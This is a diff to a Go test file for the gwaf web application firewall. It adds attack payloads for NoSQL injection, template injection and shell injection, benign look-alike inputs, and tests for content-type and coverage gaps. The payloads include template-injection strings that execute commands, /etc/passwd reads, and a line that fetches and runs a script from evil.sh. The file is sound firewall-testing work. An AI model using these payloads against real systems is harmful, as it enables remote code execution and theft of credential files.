@@ -27,10 +27,14 @@ import (
 	"compress/gzip"
 	"encoding/base64"
 	"fmt"
+	"slices"
 	"strings"
 	"testing"
 
 	"github.com/gsoultan/gwaf"
+	"github.com/gsoultan/gwaf/rules"
+	"github.com/gsoultan/gwaf/rules/op"
+	"github.com/gsoultan/gwaf/types"
 )
 
 // evasion is one attack payload with the technique it uses.
@@ -206,6 +210,99 @@ var evasions = []evasion{
 	{name: "lfi/proc environ", technique: "sensitive", arg: "/proc/self/environ"},
 	{name: "lfi/shadow", technique: "sensitive", arg: "/etc/shadow"},
 	{name: "lfi/encoded ssh key", technique: "sensitive", arg: "..%2f..%2f.ssh%2fid_rsa"},
+
+	// ---- NoSQL injection ---------------------------------------------------
+	//
+	// The payload is a *key*, not a value. Nothing dangerous appears anywhere
+	// in {"password":{"$ne":null}}, which is why a value-scanning detector
+	// finds nothing and why these cases exist as their own class.
+	{name: "nosqli/ne body", technique: "none",
+		body: `{"username":"alice","password":{"$ne":null}}`},
+	{name: "nosqli/gt body", technique: "none", body: `{"password":{"$gt":""}}`},
+	{name: "nosqli/regex body", technique: "none", body: `{"password":{"$regex":"^a"}}`},
+	{name: "nosqli/nested", technique: "none",
+		body: `{"user":{"profile":{"email":{"$regex":".*"}}}}`},
+	{name: "nosqli/or array", technique: "none", body: `{"$or":[{"a":1},{"b":2}]}`},
+	{name: "nosqli/where eval", technique: "none",
+		body: `{"$where":"this.password.length > 0"}`},
+	{name: "nosqli/function eval", technique: "none",
+		body: `{"a":{"$function":{"body":"function(){return 1}","args":[]}}}`},
+	// Express, PHP, and Rails expand bracket notation into a nested object
+	// before the database sees it, so the same attack arrives without JSON.
+	{name: "nosqli/bracket", technique: "none", target: "/f?password[$ne]=1"},
+	{name: "nosqli/bracket nested", technique: "none", target: "/f?filter[age][$gte]=0"},
+	{name: "nosqli/bracket encoded", technique: "single-encode",
+		target: "/f?password[%24ne]=1"},
+	{name: "nosqli/bracket double encoded", technique: "double-encode",
+		target: "/f?password[%2524ne]=1"},
+	{name: "nosqli/where bracket", technique: "none", target: "/f?a[$where]=1"},
+
+	// ---- server-side template injection ------------------------------------
+	//
+	// Template injection is remote code execution, and the delimiters alone are
+	// not the attack: "{{ user.name }}" is ordinary Vue, Angular, Handlebars,
+	// and Jinja. What makes these payloads is what sits *inside* the braces.
+	{name: "ssti/jinja class traversal", technique: "none",
+		arg: "{{''.__class__.__mro__[1].__subclasses__()}}"},
+	{name: "ssti/jinja globals", technique: "none",
+		arg: "{{request.application.__globals__}}"},
+	{name: "ssti/jinja config", technique: "none", arg: "{{config.items()}}"},
+	{name: "ssti/jinja builtins", technique: "none",
+		arg: "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}"},
+	{name: "ssti/spring runtime", technique: "none",
+		arg: `${T(java.lang.Runtime).getRuntime().exec("id")}`},
+	{name: "ssti/spring processbuilder", technique: "none",
+		arg: `${T(java.lang.ProcessBuilder)}`},
+	{name: "ssti/ruby erb backtick", technique: "none", arg: "<%= `id` %>"},
+	{name: "ssti/ruby erb system", technique: "none", arg: "<%= system('id') %>"},
+	{name: "ssti/ruby interp", technique: "none", arg: `#{IO.popen("id").read}`},
+	{name: "ssti/freemarker exec", technique: "none",
+		arg: `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`},
+	{name: "ssti/velocity runtime", technique: "none",
+		arg: "#set($x=$rt.getRuntime().exec('id'))"},
+	{name: "ssti/encoded jinja", technique: "single-encode",
+		arg: "%7B%7Bconfig.items()%7D%7D"},
+	{name: "ssti/double encoded jinja", technique: "double-encode",
+		arg: "%257B%257Bconfig.items()%257D%257D"},
+	{name: "ssti/body", technique: "none",
+		body: `{"template":"{{''.__class__.__mro__[1].__subclasses__()}}"}`},
+
+	// ---- shell injection beyond literal command names ----------------------
+	//
+	// Each of these executes and each defeats a list of command names, which is
+	// the whole argument for reading shell structure instead.
+	{name: "shelli/glob obfuscation", technique: "shell-expansion",
+		arg: "x; /???/c?t /etc/p?sswd"},
+	{name: "shelli/base64 pipe", technique: "shell-expansion",
+		arg: "x; echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh"},
+	{name: "shelli/or chain fetch", technique: "shell-expansion",
+		arg: "x || curl http://evil.sh|sh"},
+	{name: "shelli/substring expansion", technique: "shell-expansion",
+		arg: "x; ${PATH:0:1}etc${PATH:0:1}passwd"},
+	{name: "shelli/ifs separator", technique: "shell-expansion",
+		arg: "x; cat$IFS/etc/passwd"},
+	{name: "shelli/braced ifs", technique: "shell-expansion",
+		arg: "x; cat${IFS}/etc/passwd"},
+	{name: "shelli/brace expansion", technique: "shell-expansion",
+		arg: "x;{cat,/etc/passwd}"},
+	{name: "shelli/variable assembly", technique: "shell-expansion",
+		arg: "x; a=c;b=at;$a$b /etc/passwd"},
+	{name: "shelli/ansi c quoting", technique: "shell-expansion",
+		arg: `x; $'\x63\x61\x74' /etc/passwd`},
+	// A bare "`id`" is deliberately not reported -- it is also how Markdown
+	// writes inline code, and blocking it makes the firewall an obstacle to
+	// whoever documents the system. An actual invocation is a different thing.
+	{name: "shelli/backtick", technique: "shell-expansion", arg: "x`cat /etc/passwd`"},
+	{name: "shelli/command substitution", technique: "shell-expansion", arg: "x$(id)"},
+	{name: "shelli/quote splitting", technique: "shell-expansion",
+		arg: `x; c'a't /etc/passwd`},
+	{name: "shelli/backslash splitting", technique: "shell-expansion",
+		arg: `x; c\at /etc/passwd`},
+	{name: "shelli/nested substitution", technique: "shell-expansion",
+		arg: "x; $(echo $(id))"},
+	{name: "shelli/encoded semicolon", technique: "single-encode",
+		arg: "x%3B%20cat%20%2Fetc%2Fpasswd"},
+	{name: "shelli/body", technique: "none", body: `{"host":"1.1.1.1; cat /etc/passwd"}`},
 }
 
 // ---- the benign corpus -----------------------------------------------------
@@ -319,6 +416,192 @@ var benignTraffic = []benignCase{
 	{name: "emoji", arg: "great product 👍🎉"},
 	{name: "rtl text", arg: "مرحبا بالعالم"},
 	{name: "encoded utf8", arg: "caf%C3%A9%20r%C3%A9sum%C3%A9"},
+
+	// ---- template syntax people write on purpose ---------------------------
+	//
+	// This is the counterweight that decides whether SSTI detection is usable.
+	// Braces are not an attack: they are Vue, Angular, Handlebars, Jinja,
+	// Liquid, i18n placeholders, CI config, and shell prose. A detector that
+	// keys on the delimiters blocks every CMS, every documentation tool, and
+	// every issue tracker someone pastes a workflow into.
+	{name: "vue interpolation", arg: "{{ user.name }}"},
+	{name: "angular binding", arg: "{{ item.price | currency }}"},
+	{name: "handlebars each", arg: "{{#each items}}{{this.title}}{{/each}}"},
+	{name: "jinja loop in docs", arg: "{% for row in rows %}{{ row.id }}{% endfor %}"},
+	{name: "i18n placeholder", arg: "{{count}} items remaining"},
+	{name: "i18n named", arg: "Hello {{name}}, you have {{n}} messages"},
+	{name: "liquid template", arg: "{{ product.title | upcase }}"},
+	{name: "github actions matrix", arg: "${{ matrix.os }}"},
+	{name: "github actions secret", arg: "${{ secrets.GITHUB_TOKEN }}"},
+	{name: "shell variable prose", arg: "set ${HOME} before running"},
+	{name: "shell param expansion doc", arg: "use ${VAR:-default} for a fallback"},
+	{name: "makefile variable", arg: "$(CC) -o $@ $<"},
+	{name: "ruby interpolation doc", arg: `puts "hello #{name}"`},
+	{name: "erb in a tutorial", arg: "<%= link_to 'Home', root_path %>"},
+	{name: "grafana datasource", arg: "${datasource}"},
+	{name: "terraform interpolation", arg: "${var.region}"},
+	{name: "docker compose var", arg: "${POSTGRES_PASSWORD}"},
+	{name: "sprintf format", arg: "Total: %d items (%s)"},
+	{name: "json body with template", body: `{"subject":"Welcome {{first_name}}!"}`},
+
+	// ---- $-prefixed keys that are ordinary ---------------------------------
+	//
+	// The NoSQL counterweight. JSON Schema, JSON reference, and OData all use
+	// them, and OData in particular is a published standard with a large
+	// installed base.
+	{name: "json schema doc", body: `{"$schema":"https://json-schema.org/draft/2020-12/schema","$id":"o"}`},
+	{name: "json schema ref", body: `{"properties":{"o":{"$ref":"#/$defs/Order"}}}`},
+	{name: "json schema defs", body: `{"$defs":{"Order":{"type":"object"}},"$comment":"v2"}`},
+	{name: "dotnet typed json", body: `{"$type":"MyApp.Order, MyApp","total":42}`},
+	{name: "dotnet reference", body: `{"$id":"1","$values":[1,2,3]}`},
+	{name: "odata filter", target: "/Products?$filter=Price gt 20"},
+	{name: "odata select top", target: "/Products?$select=Name&$top=10&$skip=20"},
+	{name: "odata orderby", target: "/Orders?$orderby=Created desc&$count=true"},
+	{name: "odata search", target: "/Products?$search=blue"},
+	{name: "odata expand", target: "/Orders?$expand=Items($select=Sku)"},
+	{name: "prose about operators", arg: "use $ne to negate the comparison"},
+	{name: "prose about where", body: `{"note":"the $where clause runs javascript"}`},
+	{name: "price with dollar", arg: "$19.99"},
+	{name: "shell prose dollar", arg: "run $PATH through echo"},
+
+	// ---- shell-shaped text that is not a command ---------------------------
+	{name: "semicolon in prose", arg: "first; second; third"},
+	{name: "pipe in prose", arg: "a | b | c"},
+	{name: "ampersand in prose", arg: "Smith & Sons Ltd"},
+	{name: "path in prose", arg: "the config lives in /etc/nginx/nginx.conf"},
+	{name: "backtick code fence", arg: "use the `id` field to reference it"},
+	{name: "jquery selector", arg: "$('#main').addClass('active')"},
+	{name: "regex with dollar", arg: "^[a-z]+$"},
+	{name: "cron expression", arg: "0 */6 * * *"},
+	{name: "glob in prose", arg: "match *.log files in the directory"},
+}
+
+// sortedKeys returns a map's keys in order, so a report reads the same twice.
+func sortedKeys[V any](m map[string]V) []string {
+	out := make([]string, 0, len(m))
+	for k := range m {
+		out = append(out, k)
+	}
+	slices.Sort(out)
+	return out
+}
+
+// TestContentTypeIsNotTrusted covers a bypass that was live and invisible.
+//
+// Content-Type is attacker-controlled, and the ordinary Go idiom
+// json.NewDecoder(r.Body).Decode(&v) never reads it. gwaf did: a JSON body
+// labelled text/plain was never parsed, so object keys were never inspected and
+// {"password":{"$ne":null}} passed. Value-position payloads still matched
+// against the raw body, which is precisely why nothing failed — the corpus had
+// no key-position attack in it until NoSQL detection arrived.
+func TestContentTypeIsNotTrusted(t *testing.T) {
+	w := newWAF(t)
+
+	// Key-position: only visible once the document is parsed.
+	const keyAttack = `{"username":"alice","password":{"$ne":null}}`
+	// Value-position: visible either way, and the control for this test.
+	const valueAttack = `{"q":"1 UNION SELECT password FROM users"}`
+
+	for _, ct := range []string{
+		"application/json",
+		"application/json; charset=utf-8",
+		"application/vnd.api+json",
+		"text/plain",
+		"application/octet-stream",
+		"application/x-www-form-urlencoded",
+		"", // no Content-Type at all
+	} {
+		t.Run("ct="+ct, func(t *testing.T) {
+			for _, payload := range []string{keyAttack, valueAttack} {
+				h := map[string]string{}
+				if ct != "" {
+					h["Content-Type"] = ct
+				}
+				d := run(t, w, req{method: "POST", body: payload, headers: h})
+				if !d.Blocked() {
+					t.Errorf("NOT BLOCKED with Content-Type %q: %s", ct, payload)
+				}
+			}
+		})
+	}
+}
+
+// TestSniffingDoesNotBreakFormBodies is the counterweight: preferring the JSON
+// reading must not cost the form reading.
+func TestSniffingDoesNotBreakFormBodies(t *testing.T) {
+	w := newWAF(t)
+
+	d := run(t, w, req{method: "POST",
+		headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
+		body:    "q=1+UNION+SELECT+password+FROM+users&page=2"})
+	if !d.Blocked() {
+		t.Error("form body no longer inspected")
+	}
+
+	d = run(t, w, req{method: "POST",
+		headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
+		body:    "name=alice&city=Bandung&note=hello+world"})
+	if d.Blocked() {
+		t.Errorf("benign form body blocked: rule=%d", d.RuleID())
+	}
+}
+
+// ---- coverage by attack class ----------------------------------------------
+
+// declaredClasses are the attack classes gwaf claims to detect, each with the
+// minimum number of corpus cases that claim has to be backed by.
+//
+// This list exists because the corpus was organised by *technique* alone, and a
+// technique-only corpus cannot see a missing attack class. Seventeen encoding
+// techniques applied to SQL injection and cross-site scripting reported 76/76 —
+// a perfect score that measured canonicalization, not coverage. Template
+// injection, NoSQL injection, and LDAP injection each scored 0/0, and 0/0 does
+// not appear in a percentage.
+//
+// So a class named here with too few cases fails the build. The failure is the
+// point: it is the difference between a gap that is visible in CI and a gap
+// that has to be found by probing the firewall by hand.
+var declaredClasses = map[string]int{
+	"sqli":      8,
+	"xss":       8,
+	"traversal": 5,
+	"lfi":       5,
+	"rce":       3,
+	"nosqli":    8,
+	"ssti":      8,
+	"shelli":    8,
+	"scanner":   1,
+}
+
+// classOf returns the attack class a case belongs to, taken from its name.
+func classOf(name string) string {
+	if i := strings.IndexByte(name, '/'); i >= 0 {
+		return name[:i]
+	}
+	return name
+}
+
+// TestEveryDeclaredClassIsCovered fails when a class gwaf claims to detect has
+// no corpus behind the claim.
+func TestEveryDeclaredClassIsCovered(t *testing.T) {
+	count := map[string]int{}
+	for _, e := range evasions {
+		count[classOf(e.name)]++
+	}
+
+	for class, min := range declaredClasses {
+		if got := count[class]; got < min {
+			t.Errorf("attack class %q has %d corpus cases, want at least %d: "+
+				"an unmeasured class reports as neither caught nor missed",
+				class, got, min)
+		}
+	}
+	for class := range count {
+		if _, declared := declaredClasses[class]; !declared {
+			t.Errorf("corpus class %q is not in declaredClasses, so its "+
+				"coverage is never checked", class)
+		}
+	}
 }
 
 // ---- the tests -------------------------------------------------------------
@@ -340,19 +623,20 @@ func runEvasion(t *testing.T, w *gwaf.WAF, e evasion) gwaf.Decision {
 
 	tx.SetRequestLine(method, target, "HTTP/1.1")
 	tx.SetRemoteAddr("192.0.2.1")
+	// A JSON body is declared as such, so the case exercises the parsed-field
+	// path rather than only whole-body inspection. Bodies sent with a *wrong*
+	// content type are covered separately, by TestContentTypeIsNotTrusted.
+	if e.body != "" && e.header[0] == "" {
+		tx.AddRequestHeader("Content-Type", "application/json")
+	}
 	if e.header[0] != "" {
 		tx.AddRequestHeader(e.header[0], e.header[1])
 	}
 	if e.arg != "" {
 		tx.AddArgument("q", e.arg)
 	}
-	// A traversal payload in the target is also exposed as an argument, the way
-	// a query-string parser would.
-	if e.target != "" {
-		if i := strings.IndexByte(e.target, '='); i >= 0 {
-			tx.AddArgument("p", e.target[i+1:])
-		}
-	}
+	// The query string is not re-added here: SetRequestLine parses the request
+	// target itself, so doing it again would duplicate every argument.
 
 	if d := tx.ProcessRequestHeaders(); d.Blocked() {
 		return d
@@ -380,6 +664,9 @@ func runBenign(t *testing.T, w *gwaf.WAF, b benignCase) gwaf.Decision {
 
 	tx.SetRequestLine(method, target, "HTTP/1.1")
 	tx.SetRemoteAddr("192.0.2.1")
+	if b.body != "" && b.header[0] == "" {
+		tx.AddRequestHeader("Content-Type", "application/json")
+	}
 	if b.header[0] != "" {
 		tx.AddRequestHeader(b.header[0], b.header[1])
 	}
@@ -403,6 +690,7 @@ func TestEvasionCorpus(t *testing.T) {
 	w := newWAF(t)
 
 	byTechnique := map[string]struct{ caught, total int }{}
+	byClass := map[string]struct{ caught, total int }{}
 	var missed []string
 
 	for _, e := range evasions {
@@ -410,9 +698,12 @@ func TestEvasionCorpus(t *testing.T) {
 			d := runEvasion(t, w, e)
 
 			s := byTechnique[e.technique]
+			c := byClass[classOf(e.name)]
 			s.total++
+			c.total++
 			if d.Blocked() {
 				s.caught++
+				c.caught++
 			} else {
 				missed = append(missed, fmt.Sprintf("%s (%s)", e.name, e.technique))
 				t.Errorf("NOT BLOCKED: technique=%s\n  arg=%q target=%q header=%v body=%q\n"+
@@ -420,6 +711,7 @@ func TestEvasionCorpus(t *testing.T) {
 					d.Score(), d.Reason())
 			}
 			byTechnique[e.technique] = s
+			byClass[classOf(e.name)] = c
 		})
 	}
 
@@ -429,7 +721,17 @@ func TestEvasionCorpus(t *testing.T) {
 		total += s.total
 	}
 	t.Logf("detection: %d/%d (%.1f%%)", caught, total, 100*float64(caught)/float64(total))
-	for tech, s := range byTechnique {
+
+	// Per attack class first: a technique breakdown alone cannot show that a
+	// whole class is missing, which is how five empty classes read as 100%.
+	t.Log("by attack class:")
+	for _, class := range sortedKeys(byClass) {
+		s := byClass[class]
+		t.Logf("  %-12s %d/%d", class, s.caught, s.total)
+	}
+	t.Log("by evasion technique:")
+	for _, tech := range sortedKeys(byTechnique) {
+		s := byTechnique[tech]
 		t.Logf("  %-16s %d/%d", tech, s.caught, s.total)
 	}
 	if len(missed) > 0 {
@@ -539,9 +841,18 @@ func TestVerbatimMatchReportsNoInterpretation(t *testing.T) {
 func TestBenignTrafficBoundsRuleEvaluation(t *testing.T) {
 	w := newWAF(t)
 
-	// Well above what any single benign value should trigger, and far below
-	// the 26-rule ruleset — so a prefilter regression still fails this.
-	const maxEvaluated = 4
+	// Well above what any single benign value should trigger, and far below the
+	// full ruleset — so a prefilter regression still fails this.
+	//
+	// Raised from 4 to 6 when the template-injection and command-injection
+	// detectors landed. The corpus values that reach it are the deliberately
+	// adversarial ones — a Makefile variable, Ruby interpolation, an ERB tag, a
+	// jQuery selector — which are exactly the shapes those detectors key on.
+	// Six candidates that all reject is correct behaviour, not a regression.
+	//
+	// The number is a smoke alarm; TestRuleEvaluationDoesNotScaleWithRuleset is
+	// the actual invariant.
+	const maxEvaluated = 6
 
 	for _, b := range benignTraffic {
 		t.Run(b.name, func(t *testing.T) {
@@ -575,6 +886,56 @@ func TestBenignTrafficBoundsRuleEvaluation(t *testing.T) {
 
 			if got := tx.RulesEvaluated(); got > maxEvaluated {
 				t.Errorf("RulesEvaluated() = %d, want <= %d", got, maxEvaluated)
+			}
+		})
+	}
+}
+
+// TestRuleEvaluationDoesNotScaleWithRuleset is the invariant the constant in
+// TestBenignTrafficBoundsRuleEvaluation only approximates.
+//
+// What matters is not that a benign value evaluates few rules, but that the
+// number is a property of the *value* rather than of the ruleset size. A
+// prefilter that degrades as rules are added would still pass a fixed bound
+// while the ruleset is small, and fail in production where it is not.
+func TestRuleEvaluationDoesNotScaleWithRuleset(t *testing.T) {
+	// Padding rules that no benign value can match, so any increase in the
+	// count is the prefilter losing selectivity rather than a real candidate.
+	padding := make(rules.Set, 0, 1000)
+	for i := range 1000 {
+		padding = append(padding, rules.Rule{
+			ID:         types.RuleID(50000 + i),
+			Phase:      types.PhaseRequestHeaders,
+			Targets:    []types.Target{{Kind: types.TargetArgs}},
+			Op:         op.Contains(fmt.Sprintf("zzpadding%dzz", i)),
+			Actions:    []rules.Action{rules.Block},
+			Severity:   types.SeverityCritical,
+			Confidence: types.Certain,
+			Msg:        "padding",
+		})
+	}
+
+	small := newWAF(t)
+	large := newWAF(t, gwaf.WithRuleset(padding))
+
+	count := func(w *gwaf.WAF, value string) int {
+		tx := w.NewTransaction()
+		defer tx.Close()
+		tx.SetRequestLine("GET", "/search", "HTTP/1.1")
+		tx.AddArgument("q", value)
+		tx.ProcessRequestHeaders()
+		tx.ProcessRequestBody()
+		return tx.RulesEvaluated()
+	}
+
+	for _, b := range benignTraffic {
+		if b.arg == "" {
+			continue
+		}
+		t.Run(b.name, func(t *testing.T) {
+			if a, z := count(small, b.arg), count(large, b.arg); a != z {
+				t.Errorf("evaluated %d rules with 34 rules and %d with 1034: "+
+					"the prefilter is losing selectivity as the ruleset grows", a, z)
 			}
 		})
 	}
